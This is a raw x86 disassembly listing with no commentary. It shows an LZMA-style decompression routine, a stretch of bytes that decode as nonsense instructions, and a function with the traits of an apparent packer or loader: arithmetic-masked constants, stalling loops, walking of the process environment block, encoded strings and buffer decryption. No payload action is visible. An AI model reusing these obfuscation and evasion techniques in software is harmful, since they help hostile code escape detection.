  420014:	mov    cl,BYTE PTR [ebp-0xc]
  420017:	and    edi,DWORD PTR [ebp-0x14]
  42001a:	shl    edi,cl
  42001c:	sub    cl,0x8
  42001f:	neg    cl
  420021:	shr    esi,cl
  420023:	pop    eax
  420024:	add    edi,esi
  420026:	pop    esi
  420027:	lea    edi,[edi+edi*2]
  42002a:	shl    edi,0x8
  42002d:	cmp    al,0x7
  42002f:	pop    edx
  420030:	lea    ecx,[esi+edi*2+0xe6c]
  420037:	push   ecx
  420038:	push   esi
  420039:	mov    esi,0x100
  42003e:	push   eax
  42003f:	mov    al,0x1
  420041:	jb     0x420077
  420043:	mov    edi,DWORD PTR [ebp-0x4]
  420046:	sub    edi,DWORD PTR [ebp-0x24]
  420049:	movzx  edi,BYTE PTR [edi]
  42004c:	mov    ebp,DWORD PTR [ebp-0x34]
  42004f:	shl    edi,1
  420051:	mov    ecx,esi
  420053:	and    esi,edi
  420055:	add    ecx,esi
  420057:	lea    ebp,[ebp+ecx*2+0x0]
  42005b:	call   0x420310
  420060:	mov    ecx,eax
  420062:	shr    esi,0x8
  420065:	and    ecx,0x1
  420068:	cmp    esi,ecx
  42006a:	mov    esi,0x100
  42006f:	jne    0x42007f
  420071:	cmp    eax,esi
  420073:	jb     0x42004c
  420075:	jmp    0x42008b
  420077:	mov    ebp,DWORD PTR [ebp-0x34]
  42007a:	call   0x420310
  42007f:	inc    eax
  420080:	inc    esi
  420081:	sub    eax,0x1
  420084:	sub    esi,0x1
  420087:	cmp    eax,esi
  420089:	jb     0x420077
  42008b:	pop    edx
  42008c:	inc    edx
  42008d:	cmp    edx,0x5
  420090:	dec    edx
  420091:	mov    ecx,edx
  420093:	jb     0x4200a4
  420095:	inc    edx
  420096:	cmp    edx,0xb
  420099:	dec    edx
  42009a:	mov    cl,0x4
  42009c:	dec    cl
  42009e:	jb     0x4200a4
  4200a0:	mov    cl,0x7
  4200a2:	dec    cl
  4200a4:	sub    edx,ecx
  4200a6:	push   edx
  4200a7:	jmp    0x4200f8
  4200a9:	mov    al,0xc1
  4200ab:	dec    al
  4200ad:	call   0x420301
  4200b2:	jne    0x4200c8
  4200b4:	pop    eax
  4200b5:	pop    edi
  4200b6:	pop    edx
  4200b7:	pop    ecx
  4200b8:	pop    edx
  4200b9:	pop    ecx
  4200ba:	push   DWORD PTR [esp]
  4200bd:	push   ecx
  4200be:	push   edx
  4200bf:	mov    edx,0x664
  4200c4:	mov    cl,0x0
  4200c6:	jmp    0x42013b
  4200c8:	mov    al,0xcd
  4200ca:	dec    al
  4200cc:	call   0x420301
  4200d1:	jne    0x420101
  4200d3:	mov    al,0xf1
  4200d5:	dec    al
  4200d7:	call   0x4202f1
  4200dc:	jne    0x420131
  4200de:	pop    eax
  4200df:	cmp    al,0x7
  4200e1:	mov    al,0x9
  4200e3:	jb     0x4200e7
  4200e5:	mov    al,0xb
  4200e7:	push   eax
  4200e8:	mov    esi,DWORD PTR [ebp-0x4]
  4200eb:	sub    esi,DWORD PTR [ebp-0x24]
  4200ee:	cmp    esi,DWORD PTR [ebp+0x24]
  4200f1:	jb     0x4202c8
  4200f7:	lods   al,BYTE PTR ds:[esi]
  4200f8:	mov    edi,DWORD PTR [ebp-0x4]
  4200fb:	stos   BYTE PTR es:[edi],al
  4200fc:	jmp    0x42028f
  420101:	mov    al,0xd8
  420103:	call   0x420301
  420108:	mov    esi,DWORD PTR [ebp-0x28]
  42010b:	je     0x420128
  42010d:	mov    al,0xe4
  42010f:	call   0x420301
  420114:	mov    esi,DWORD PTR [ebp-0x2c]
  420117:	je     0x420122
  420119:	mov    esi,DWORD PTR [ebp-0x30]
  42011c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42011f:	mov    DWORD PTR [ebp-0x30],ecx
  420122:	mov    ecx,DWORD PTR [ebp-0x28]
  420125:	mov    DWORD PTR [ebp-0x2c],ecx
  420128:	mov    ecx,DWORD PTR [ebp-0x24]
  42012b:	mov    DWORD PTR [ebp-0x28],ecx
  42012e:	mov    DWORD PTR [ebp-0x24],esi
  420131:	pop    eax
  420132:	pop    edi
  420133:	pop    ecx
  420134:	mov    edx,0xa68
  420139:	mov    cl,0x8
  42013b:	add    edx,edi
  42013d:	push   edx
  42013e:	push   edi
  42013f:	cmp    al,0x7
  420141:	mov    al,cl
  420143:	jb     0x420147
  420145:	add    al,0x3
  420147:	push   eax
  420148:	mov    ebp,DWORD PTR [ebp-0x34]
  42014b:	call   0x42030e
  420150:	jne    0x420166
  420152:	mov    eax,DWORD PTR [ebp-0x18]
  420155:	mov    edi,DWORD PTR [ebp-0x34]
  420158:	shl    eax,0x3
  42015b:	sub    ecx,ecx
  42015d:	push   0x8
  42015f:	pop    esi
  420160:	lea    edi,[edi+eax*2+0x4]
  420164:	jmp    0x42019b
  420166:	mov    ebp,DWORD PTR [ebp-0x34]
  420169:	add    ebp,0x2
  42016c:	call   0x42030e
  420171:	jne    0x42018b
  420173:	mov    eax,DWORD PTR [ebp-0x18]
  420176:	mov    edi,DWORD PTR [ebp-0x34]
  420179:	shl    eax,0x3
  42017c:	push   0x8
  42017e:	pop    ecx
  42017f:	push   0x8
  420181:	pop    esi
  420182:	lea    edi,[edi+eax*2+0x104]
  420189:	jmp    0x42019b
  42018b:	mov    edi,0x204
  420190:	add    edi,DWORD PTR [ebp-0x34]
  420193:	push   0x10
  420195:	pop    ecx
  420196:	mov    esi,0x100
  42019b:	mov    DWORD PTR [ebp-0x1c],ecx
  42019e:	sub    eax,eax
  4201a0:	inc    eax
  4201a1:	mov    ebp,edi
  4201a3:	call   0x420310
  4201a8:	mov    ecx,eax
  4201aa:	sub    ecx,esi
  4201ac:	jb     0x4201a1
  4201ae:	add    DWORD PTR [ebp-0x1c],ecx
  4201b1:	cmp    DWORD PTR [ebp-0x3c],0x4
  4201b5:	jae    0x42026b
  4201bb:	add    DWORD PTR [ebp-0x3c],0x7
  4201bf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4201c2:	cmp    ecx,0x4
  4201c5:	jb     0x4201ca
  4201c7:	push   0x3
  4201c9:	pop    ecx
  4201ca:	mov    edi,DWORD PTR [ebp-0x38]
  4201cd:	shl    ecx,0x6
  4201d0:	sub    eax,eax
  4201d2:	inc    eax
  4201d3:	push   0x40
  4201d5:	pop    esi
  4201d6:	lea    edi,[edi+ecx*2+0x360]
  4201dd:	mov    ebp,edi
  4201df:	call   0x420310
  4201e4:	mov    ecx,eax
  4201e6:	sub    ecx,esi
  4201e8:	jb     0x4201dd
  4201ea:	mov    DWORD PTR [ebp-0x18],ecx
  4201ed:	mov    DWORD PTR [ebp-0x24],ecx
  4201f0:	cmp    ecx,0x4
  4201f3:	jb     0x420268
  4201f5:	mov    esi,ecx
  4201f7:	and    DWORD PTR [ebp-0x24],0x1
  4201fb:	shr    esi,1
  4201fd:	or     DWORD PTR [ebp-0x24],0x2
  420201:	dec    esi
  420202:	cmp    ecx,0xe
  420205:	jae    0x420220
  420207:	mov    eax,0x2af
  42020c:	sub    eax,ecx
  42020e:	mov    ecx,esi
  420210:	shl    BYTE PTR [ebp-0x24],cl
  420213:	add    eax,DWORD PTR [ebp-0x24]
  420216:	shl    eax,1
  420218:	add    eax,DWORD PTR [ebp-0x38]
  42021b:	mov    DWORD PTR [ebp-0x34],eax
  42021e:	jmp    0x42024d
  420220:	sub    esi,0x4
  420223:	call   0x4202cd
  420228:	shr    ebx,1
  42022a:	shl    DWORD PTR [ebp-0x24],1
  42022d:	cmp    DWORD PTR [ebp-0x20],ebx
  420230:	jb     0x420238
  420232:	inc    DWORD PTR [ebp-0x24]
  420235:	sub    DWORD PTR [ebp-0x20],ebx
  420238:	dec    esi
  420239:	jne    0x420223
  42023b:	mov    eax,0x644
  420240:	add    eax,DWORD PTR [ebp-0x38]
  420243:	mov    DWORD PTR [ebp-0x34],eax
  420246:	shl    DWORD PTR [ebp-0x24],0x4
  42024a:	push   0x4
  42024c:	pop    esi
  42024d:	sub    edi,edi
  42024f:	inc    edi
  420250:	mov    eax,edi
  420252:	mov    ebp,DWORD PTR [ebp-0x34]
  420255:	call   0x420310
  42025a:	test   al,0x1
  42025c:	je     0x420261
  42025e:	or     DWORD PTR [ebp-0x24],edi
  420261:	shl    edi,1
  420263:	dec    esi
  420264:	jne    0x420252
  420266:	jmp    0x420268
  420268:	inc    DWORD PTR [ebp-0x24]
  42026b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42026e:	add    ecx,0x2
  420271:	mov    edi,DWORD PTR [ebp-0x4]
  420274:	mov    eax,edi
  420276:	sub    eax,DWORD PTR [ebp+0x24]
  420279:	cmp    DWORD PTR [ebp-0x24],eax
  42027c:	ja     0x4202c8
  42027e:	mov    esi,edi
  420280:	sub    esi,DWORD PTR [ebp-0x24]
  420283:	mov    edx,DWORD PTR [ebp+0x28]
  420286:	lods   al,BYTE PTR ds:[esi]
  420287:	stos   BYTE PTR es:[edi],al
  420288:	cmp    edi,edx
  42028a:	jae    0x42028f
  42028c:	dec    ecx
  42028d:	jne    0x420286
  42028f:	mov    DWORD PTR [ebp-0x4],edi
  420292:	movzx  esi,al
  420295:	cmp    edi,DWORD PTR [ebp+0x28]
  420298:	jb     0x41fff9
  42029e:	call   0x4202cd
  4202a3:	sub    eax,eax
  4202a5:	lea    ebp,[esp+0x3c]
  4202a9:	mov    edx,DWORD PTR [ebp+0x20]
  4202ac:	mov    esi,DWORD PTR [ebp-0x8]
  4202af:	sub    esi,DWORD PTR [ebp+0x18]
  4202b2:	mov    DWORD PTR [edx],esi
  4202b4:	mov    edx,DWORD PTR [ebp+0x2c]
  4202b7:	mov    edi,DWORD PTR [ebp-0x4]
  4202ba:	sub    edi,DWORD PTR [ebp+0x24]
  4202bd:	mov    DWORD PTR [edx],edi
  4202bf:	leave  
  4202c0:	pop    ebx
  4202c1:	pop    esi
  4202c2:	pop    edi
  4202c3:	ret    0x1c
  4202c6:	pop    esi
  4202c7:	pop    eax
  4202c8:	sub    eax,eax
  4202ca:	inc    eax
  4202cb:	jmp    0x4202a5
  4202cd:	cmp    ebx,0x1000000
  4202d3:	jb     0x4202d6
  4202d5:	ret    
  4202d6:	shl    ebx,0x8
  4202d9:	push   esi
  4202da:	mov    esi,DWORD PTR [ebp-0x8]
  4202dd:	cmp    esi,DWORD PTR [ebp+0x1c]
  4202e0:	jae    0x4202c6
  4202e2:	mov    ecx,0xe920ea0
  4202e7:	stos   DWORD PTR es:[edi],eax
  4202e8:	cmp    eax,0xb10ea0b1
  4202ed:	pusha  
  4202ee:	outs   dx,BYTE PTR ds:[esi]
  4202ef:	add    al,0x9a
  4202f1:	mov    ecx,0x65c79ec0
  4202f6:	mov    ss,WORD PTR [edx-0x5f6864ee]
  4202fc:	cs xchg edi,eax
  4202fe:	xchg   edx,eax
  4202ff:	cmp    ah,BYTE PTR [ebx-0x68719a39]
  420305:	mov    al,ds:0xae40b99e
  42030a:	sar    DWORD PTR [eax+eiz*4],0x8b
  42030e:	aaa    
  42030f:	mov    es,ecx
  420311:	cmp    al,0xa0
  420313:	mov    edx,DWORD PTR [ecx-0x74747486]
  420319:	(bad)  
  42031a:	pop    eax
  42031b:	sti    
  42031c:	mov    ecx,0x926b1bbc
  420321:	sbb    al,0x1b
  420323:	or     ebp,DWORD PTR [ebx-0x3e44389]
  420329:	pop    eax
  42032a:	std    
  42032b:	mov    ch,0xcf
  42032d:	mov    bl,BYTE PTR [ebx+ebx*1-0x54e56d95]
  420334:	lods   eax,DWORD PTR ds:[esi]
  420335:	fcomp  QWORD PTR [ebx]
  420337:	or     edi,DWORD PTR [ecx-0x1f963846]
  42033d:	mov    edx,DWORD PTR [edx+0x49c7b732]
  420343:	mov    dh,0x6f
  420345:	mov    esp,0xe7580b1b
  42034a:	mov    ecx,0xab8b71f2
  42034f:	mov    ecx,DWORD PTR [ebx+0x3292b637]
  420355:	lahf   
  420356:	and    al,0x8f
  420358:	ror    BYTE PTR [ebx+0x3cc18e97],0x1b
  42035f:	mov    WORD PTR [edx+0x29053692],ds
  420365:	dec    esp
  420366:	and    al,0x20
  420368:	sub    ebx,ecx
  42036a:	sub    WORD PTR [ebp+0x0],dx
  42036e:	add    eax,eax
  420370:	add    eax,0x1
  420373:	lea    ebp,[esp+0x40]
  420377:	ret    
  420378:	push   ebp
  420379:	mov    ebp,esp
  42037b:	sub    esp,0x12c
  420381:	push   ebx
  420382:	push   esi
  420383:	push   edi
  420384:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42038b:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  420392:	mov    eax,DWORD PTR [ebp+0x8]
  420395:	mov    DWORD PTR [ebp+0x8],eax
  420398:	mov    ecx,DWORD PTR [ebp-0x10]
  42039b:	mov    ebx,0x75108b3
  4203a0:	xor    ecx,ebx
  4203a2:	mov    eax,0x3272fa
  4203a7:	add    ecx,eax
  4203a9:	mov    DWORD PTR [ebp-0x2c],ecx
  4203ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4203af:	xor    ecx,ebx
  4203b1:	add    ecx,eax
  4203b3:	mov    DWORD PTR [ebp-0x3c],ecx
  4203b6:	mov    ecx,DWORD PTR [ebp-0x10]
  4203b9:	xor    ecx,ebx
  4203bb:	add    ecx,eax
  4203bd:	mov    DWORD PTR [ebp-0x40],ecx
  4203c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4203c3:	xor    ecx,ebx
  4203c5:	add    ecx,eax
  4203c7:	mov    DWORD PTR [ebp-0xd8],ecx
  4203cd:	mov    DWORD PTR [ebp-0x50],0xf89f05b5
  4203d4:	mov    DWORD PTR [ebp-0x40],0xf89cb5b5
  4203db:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  4203e2:	push   0x25
  4203e4:	pop    ecx
  4203e5:	mov    DWORD PTR [ebp-0x38],ecx
  4203e8:	mov    DWORD PTR [ebp-0x38],ecx
  4203eb:	push   0x65
  4203ed:	pop    ecx
  4203ee:	mov    DWORD PTR [ebp-0x38],ecx
  4203f1:	mov    DWORD PTR [ebp-0x38],ecx
  4203f4:	mov    DWORD PTR [ebp-0x38],0x4d
  4203fb:	mov    DWORD PTR [ebp-0x38],0x43
  420402:	mov    ecx,DWORD PTR [ebp-0x10]
  420405:	xor    ecx,ebx
  420407:	add    ecx,eax
  420409:	mov    DWORD PTR [ebp-0x38],ecx
  42040c:	mov    ecx,DWORD PTR [ebp-0x10]
  42040f:	xor    ecx,ebx
  420411:	add    ecx,eax
  420413:	mov    DWORD PTR [ebp-0x38],ecx
  420416:	mov    DWORD PTR [ebp-0x28],0x258
  42041d:	mov    DWORD PTR [ebp-0x20],0x36
  420424:	mov    DWORD PTR [ebp-0x14],0x7a
  42042b:	lea    edi,[ebp-0x10c]
  420431:	lea    esi,[ebp-0x12c]
  420437:	call   0x4210f9
  42043c:	dec    DWORD PTR [ebp-0x14]
  42043f:	jne    0x42042b
  420441:	dec    DWORD PTR [ebp-0x20]
  420444:	jne    0x420424
  420446:	dec    DWORD PTR [ebp-0x28]
  420449:	jne    0x42041d
  42044b:	mov    DWORD PTR [ebp-0x28],0x400e
  420452:	mov    eax,DWORD PTR [ebp-0x10]
  420455:	xor    eax,ebx
  420457:	mov    esi,0x3272fa
  42045c:	add    eax,esi
  42045e:	mov    DWORD PTR [ebp-0x1c],eax
  420461:	mov    eax,DWORD PTR [ebp-0x10]
  420464:	and    DWORD PTR [ebp-0x94],0x0
  42046b:	xor    eax,ebx
  42046d:	add    eax,esi
  42046f:	mov    DWORD PTR [ebp-0x34],eax
  420472:	mov    eax,fs:0x18
  420478:	mov    DWORD PTR [ebp-0x94],eax
  42047e:	mov    eax,DWORD PTR [eax+0x30]
  420481:	mov    DWORD PTR [ebp-0xcc],eax
  420487:	mov    eax,DWORD PTR [eax+0xc]
  42048a:	mov    DWORD PTR [ebp-0xc0],eax
  420490:	mov    eax,DWORD PTR [ebp+0x8]
  420493:	lea    ecx,[ebp-0x94]
  420499:	mov    DWORD PTR [eax+0x1a0],ecx
  42049f:	mov    eax,DWORD PTR [ebp+0x8]
  4204a2:	lea    ecx,[ebp-0xcc]
  4204a8:	mov    DWORD PTR [eax+0x1a4],ecx
  4204ae:	mov    eax,DWORD PTR [ebp+0x8]
  4204b1:	push   DWORD PTR [ebp+0x8]
  4204b4:	lea    ecx,[ebp-0xc0]
  4204ba:	mov    DWORD PTR [eax+0x1a8],ecx
  4204c0:	call   0x4228ba
  4204c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4204c8:	xor    ecx,ebx
  4204ca:	add    ecx,esi
  4204cc:	cmp    ecx,eax
  4204ce:	je     0x420851
  4204d4:	mov    eax,DWORD PTR [ebp+0x8]
  4204d7:	mov    eax,DWORD PTR [eax+0x194]
  4204dd:	mov    ecx,DWORD PTR [eax]
  4204df:	mov    eax,DWORD PTR [ebp+0x8]
  4204e2:	mov    eax,DWORD PTR [eax+0x194]
  4204e8:	mov    eax,DWORD PTR [eax]
  4204ea:	add    eax,DWORD PTR [ecx+0x3c]
  4204ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4204f0:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4204f6:	lea    edx,[ebp-0xec]
  4204fc:	push   edx
  4204fd:	mov    edx,DWORD PTR [ebp+0x8]
  420500:	mov    edx,DWORD PTR [edx+0x18c]
  420506:	mov    edx,DWORD PTR [edx]
  420508:	add    edx,DWORD PTR [eax+0x88]
  42050e:	push   0x4
  420510:	push   DWORD PTR [eax+0x8c]
  420516:	push   edx
  420517:	call   DWORD PTR [ecx+0x1c]
  42051a:	push   DWORD PTR [ebp+0x8]
  42051d:	xor    eax,eax
  42051f:	mov    DWORD PTR [ebp-0xa8],0xe3bcecc2
  420529:	mov    DWORD PTR [ebp-0xa4],0xe8c7edda
  420533:	mov    DWORD PTR [ebp-0xa0],0xbaeddef0
  42053d:	mov    BYTE PTR [ebp-0x9c],0x7b
  420544:	lea    edi,[ebp-0x9b]
  42054a:	stos   DWORD PTR es:[edi],eax
  42054b:	stos   WORD PTR es:[edi],ax
  42054d:	stos   BYTE PTR es:[edi],al
  42054e:	xor    eax,eax
  420550:	mov    DWORD PTR [ebp-0xbc],0xe3bcecc2
  42055a:	mov    DWORD PTR [ebp-0xb8],0xe8c7edda
  420564:	mov    DWORD PTR [ebp-0xb4],0xd0eddef0
  42056e:	mov    BYTE PTR [ebp-0xb0],0x7b
  420575:	lea    edi,[ebp-0xaf]
  42057b:	stos   DWORD PTR es:[edi],eax
  42057c:	stos   WORD PTR es:[edi],ax
  42057e:	stos   BYTE PTR es:[edi],al
  42057f:	mov    edi,DWORD PTR [ebp+0x8]
  420582:	mov    eax,DWORD PTR [ebp+0x8]
  420585:	mov    edx,DWORD PTR [eax+0x1b8]
  42058b:	mov    DWORD PTR [ebp-0x68],0xedefece7
  420592:	mov    DWORD PTR [ebp-0x64],0xe2ebe6dc
  420599:	mov    WORD PTR [ebp-0x60],0x7bba
  42059f:	mov    DWORD PTR [ebp-0x90],0xe3bcecc2
  4205a9:	mov    DWORD PTR [ebp-0x8c],0xe7baedda
  4205b3:	mov    DWORD PTR [ebp-0x88],0xc9dae3eb
  4205bd:	mov    DWORD PTR [ebp-0x84],0xeddee6ee
  4205c7:	mov    DWORD PTR [ebp-0x80],0x7bbadce2
  4205ce:	mov    DWORD PTR [ebp-0x7c],0xe3bcecc2
  4205d5:	mov    DWORD PTR [ebp-0x78],0xe7baedda
  4205dc:	mov    DWORD PTR [ebp-0x74],0xc9dae3eb
  4205e3:	mov    DWORD PTR [ebp-0x70],0xeddee6ee
  4205ea:	mov    DWORD PTR [ebp-0x6c],0x7bd0dce2
  4205f1:	call   0x4228e9
  4205f6:	push   eax
  4205f7:	mov    eax,DWORD PTR [ebp+0x8]
  4205fa:	mov    eax,DWORD PTR [eax+0x1a8]
  420600:	push   DWORD PTR [eax]
  420602:	call   0x42258a
  420607:	test   eax,eax
  420609:	jne    0x42065b
  42060b:	mov    eax,DWORD PTR [ebp+0x8]
  42060e:	mov    eax,DWORD PTR [eax+0x1e0]
  420614:	mov    edi,DWORD PTR [ebp+0x8]
  420617:	add    eax,0x4
  42061a:	mov    DWORD PTR [ebp-0x24],eax
  42061d:	mov    eax,DWORD PTR [ebp+0x8]
  420620:	mov    edx,DWORD PTR [eax+0x1b8]
  420626:	call   0x4228e9
  42062b:	push   eax
  42062c:	mov    eax,DWORD PTR [ebp-0x24]
  42062f:	call   DWORD PTR [eax]
  420631:	test   eax,eax
  420633:	jne    0x42065b
  420635:	mov    eax,DWORD PTR [ebp+0x8]
  420638:	mov    eax,DWORD PTR [eax+0x1e0]
  42063e:	mov    edi,DWORD PTR [ebp+0x8]
  420641:	add    eax,0x10
  420644:	mov    DWORD PTR [ebp-0x24],eax
  420647:	mov    eax,DWORD PTR [ebp+0x8]
  42064a:	mov    edx,DWORD PTR [eax+0x1b8]
  420650:	call   0x4228e9
  420655:	push   eax
  420656:	mov    eax,DWORD PTR [ebp-0x24]
  420659:	call   DWORD PTR [eax]
  42065b:	mov    eax,DWORD PTR [ebp-0x10]
  42065e:	mov    ecx,DWORD PTR [ebp-0x28]
  420661:	xor    eax,ebx
  420663:	add    eax,esi
  420665:	cmp    eax,ecx
  420667:	je     0x42082a
  42066d:	mov    eax,DWORD PTR [ebp-0x18]
  420670:	xor    eax,ebx
  420672:	mov    ecx,0xffcd8d06
  420677:	sub    ecx,eax
  420679:	add    ecx,DWORD PTR [ebp-0x28]
  42067c:	mov    eax,DWORD PTR [ebp-0x1c]
  42067f:	cmp    eax,ecx
  420681:	ja     0x42082a
  420687:	mov    DWORD PTR [ebp-0x20],0x0
  42068e:	push   DWORD PTR [ebp+0x8]
  420691:	mov    edi,DWORD PTR [ebp+0x8]
  420694:	mov    eax,DWORD PTR [ebp+0x8]
  420697:	mov    edx,DWORD PTR [eax+0x1b4]
  42069d:	call   0x4228e9
  4206a2:	push   eax
  4206a3:	mov    eax,DWORD PTR [ebp+0x8]
  4206a6:	mov    eax,DWORD PTR [eax+0x1a8]
  4206ac:	push   DWORD PTR [eax]
  4206ae:	call   0x42258a
  4206b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4206b6:	mov    ecx,DWORD PTR [ecx+0x19c]
  4206bc:	mov    DWORD PTR [ecx],eax
  4206be:	mov    eax,DWORD PTR [ebp+0x8]
  4206c1:	mov    edi,DWORD PTR [eax+0x1e0]
  4206c7:	mov    esi,DWORD PTR [ebp+0x8]
  4206ca:	xor    eax,eax
  4206cc:	lea    edx,[ebp-0x7c]
  4206cf:	call   0x42291f
  4206d4:	push   eax
  4206d5:	mov    eax,DWORD PTR [ebp+0x8]
  4206d8:	mov    eax,DWORD PTR [eax+0x19c]
  4206de:	push   DWORD PTR [eax]
  4206e0:	call   DWORD PTR [edi+0x8]
  4206e3:	mov    DWORD PTR [ebp-0x24],eax
  4206e6:	mov    eax,DWORD PTR [ebp+0x8]
  4206e9:	mov    edi,DWORD PTR [eax+0x1e0]
  4206ef:	mov    esi,DWORD PTR [ebp+0x8]
  4206f2:	xor    eax,eax
  4206f4:	lea    edx,[ebp-0x90]
  4206fa:	call   0x42291f
  4206ff:	push   eax
  420700:	mov    eax,DWORD PTR [ebp+0x8]
  420703:	mov    eax,DWORD PTR [eax+0x19c]
  420709:	push   DWORD PTR [eax]
  42070b:	call   DWORD PTR [edi+0x8]
  42070e:	mov    eax,DWORD PTR [ebp+0x8]
  420711:	mov    edi,DWORD PTR [eax+0x1e0]
  420717:	mov    esi,DWORD PTR [ebp+0x8]
  42071a:	xor    eax,eax
  42071c:	lea    edx,[ebp-0xa8]
  420722:	call   0x42291f
  420727:	push   eax
  420728:	mov    eax,DWORD PTR [ebp+0x8]
  42072b:	mov    eax,DWORD PTR [eax+0x19c]
  420731:	push   DWORD PTR [eax]
  420733:	call   DWORD PTR [edi+0x8]
  420736:	and    DWORD PTR [ebp-0x8],0x0
  42073a:	mov    DWORD PTR [ebp-0x44],eax
  42073d:	mov    eax,DWORD PTR [ebp-0x8]
  420740:	and    eax,0x7
  420743:	add    eax,0x31
  420746:	push   eax
  420747:	call   DWORD PTR [ebp-0x24]
  42074a:	test   eax,eax
  42074c:	je     0x420790
  42074e:	mov    eax,DWORD PTR [ebp-0x8]
  420751:	push   0x19
  420753:	xor    edx,edx
  420755:	pop    ecx
  420756:	div    ecx
  420758:	add    dl,0x41
  42075b:	movzx  eax,dl
  42075e:	push   eax
  42075f:	call   DWORD PTR [ebp-0x44]
  420762:	test   eax,eax
  420764:	jne    0x420790
  420766:	mov    eax,DWORD PTR [ebp+0x8]
  420769:	mov    edi,DWORD PTR [eax+0x1e0]
  42076f:	mov    esi,DWORD PTR [ebp+0x8]
  420772:	xor    eax,eax
  420774:	lea    edx,[ebp-0x68]
  420777:	call   0x42291f
  42077c:	push   eax
  42077d:	mov    eax,DWORD PTR [ebp+0x8]
  420780:	mov    eax,DWORD PTR [eax+0x198]
  420786:	push   DWORD PTR [eax]
  420788:	call   DWORD PTR [edi+0x8]
  42078b:	mov    DWORD PTR [ebp-0x14],eax
  42078e:	jmp    0x420794
  420790:	and    DWORD PTR [ebp-0x14],0x0
  420794:	inc    DWORD PTR [ebp-0x8]
  420797:	cmp    DWORD PTR [ebp-0x8],0x10
  42079b:	jb     0x42073d
  42079d:	mov    eax,DWORD PTR [ebp-0x18]
  4207a0:	mov    esi,DWORD PTR [ebp+0x8]
  4207a3:	xor    eax,ebx
  4207a5:	mov    edi,0x3272fa
  4207aa:	add    eax,edi
  4207ac:	lea    edx,[ebp-0x10c]
  4207b2:	call   0x42291f
  4207b7:	push   eax
  4207b8:	mov    eax,DWORD PTR [ebp-0x10]
  4207bb:	mov    esi,DWORD PTR [ebp+0x8]
  4207be:	xor    eax,ebx
  4207c0:	add    eax,edi
  4207c2:	lea    edx,[ebp-0x12c]
  4207c8:	call   0x42291f
  4207cd:	push   eax
  4207ce:	call   DWORD PTR [ebp-0x14]
  4207d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4207d4:	xor    ecx,ebx
  4207d6:	add    ecx,edi
  4207d8:	cmp    ecx,eax
  4207da:	jne    0x4207e3
  4207dc:	mov    DWORD PTR [ebp-0x20],0x1
  4207e3:	mov    eax,DWORD PTR [ebp-0x18]
  4207e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4207e9:	xor    eax,ebx
  4207eb:	lea    eax,[eax+ecx*1+0x3272fa]
  4207f2:	mov    DWORD PTR [ebp-0x1c],eax
  4207f5:	mov    eax,DWORD PTR [ebp-0x20]
  4207f8:	test   eax,eax
  4207fa:	je     0x42080e
  4207fc:	mov    eax,DWORD PTR [ebp-0x18]
  4207ff:	mov    ecx,DWORD PTR [ebp-0x34]
  420802:	xor    eax,ebx
  420804:	lea    eax,[eax+ecx*1+0x3272fa]
  42080b:	mov    DWORD PTR [ebp-0x34],eax
  42080e:	mov    eax,DWORD PTR [ebp-0x18]
  420811:	xor    eax,ebx
  420813:	mov    ecx,0xffcd8d06
  420818:	sub    ecx,eax
  42081a:	add    ecx,DWORD PTR [ebp-0x28]
  42081d:	mov    eax,DWORD PTR [ebp-0x1c]
  420820:	cmp    eax,ecx
  420822:	jbe    0x420687
  420828:	mov    esi,edi
  42082a:	mov    eax,DWORD PTR [ebp-0x34]
  42082d:	mov    ecx,DWORD PTR [ebp-0x1c]
  420830:	cmp    ecx,eax
  420832:	jne    0x420845
  420834:	push   DWORD PTR [ebp+0x8]
  420837:	lea    eax,[ebp-0x3c]
  42083a:	push   eax
  42083b:	call   0x42338e
  420840:	mov    DWORD PTR [ebp-0x2c],eax
  420843:	jmp    0x420851
  420845:	mov    eax,DWORD PTR [ebp-0x2c]
  420848:	mov    ecx,DWORD PTR [ebp-0x18]
  42084b:	xor    ecx,ebx
  42084d:	add    ecx,esi
  42084f:	xor    DWORD PTR [eax],ecx
  420851:	mov    eax,DWORD PTR [ebp-0x10]
  420854:	mov    ecx,DWORD PTR [ebp-0x2c]
  420857:	xor    eax,ebx
  420859:	add    eax,esi
  42085b:	cmp    eax,ecx
  42085d:	je     0x420fd7
  420863:	mov    eax,DWORD PTR [ebp-0x10]
  420866:	mov    ecx,DWORD PTR [ebp-0x3c]
  420869:	xor    eax,ebx
  42086b:	add    eax,esi
  42086d:	cmp    eax,ecx
  42086f:	je     0x420fd7
  420875:	mov    eax,DWORD PTR [ebp-0x10]
  420878:	xor    eax,ebx
  42087a:	add    eax,esi
  42087c:	jmp    0x42089a
  42087e:	mov    edi,DWORD PTR [ebp-0x2c]
  420881:	mov    cl,al
  420883:	and    cl,0x1f
  420886:	or     dl,0xff
  420889:	sub    dl,cl
  42088b:	add    BYTE PTR [edi+eax*1],dl
  42088e:	mov    ecx,DWORD PTR [ebp-0x18]
  420891:	xor    ecx,ebx
  420893:	lea    eax,[eax+ecx*1+0x3272fa]
  42089a:	mov    ecx,DWORD PTR [ebp-0x3c]
  42089d:	cmp    eax,ecx
  42089f:	jb     0x42087e
  4208a1:	mov    eax,DWORD PTR [ebp-0x3c]
  4208a4:	mov    DWORD PTR [ebp-0x28],eax
  4208a7:	mov    eax,DWORD PTR [ebp-0x2c]
  4208aa:	mov    DWORD PTR [ebp-0x34],0xf89c85b5
  4208b1:	mov    DWORD PTR [ebp-0xd4],eax
  4208b7:	mov    edi,0xf89c85b4
  4208bc:	mov    DWORD PTR [ebp-0x30],edi
  4208bf:	mov    eax,DWORD PTR [ebp-0x34]
  4208c2:	xor    eax,ebx
  4208c4:	add    eax,esi
  4208c6:	mov    DWORD PTR [ebp-0xc],eax
  4208c9:	mov    eax,DWORD PTR [ebp-0x34]
  4208cc:	xor    eax,ebx
  4208ce:	add    eax,esi
  4208d0:	mov    DWORD PTR [ebp-0x8],eax
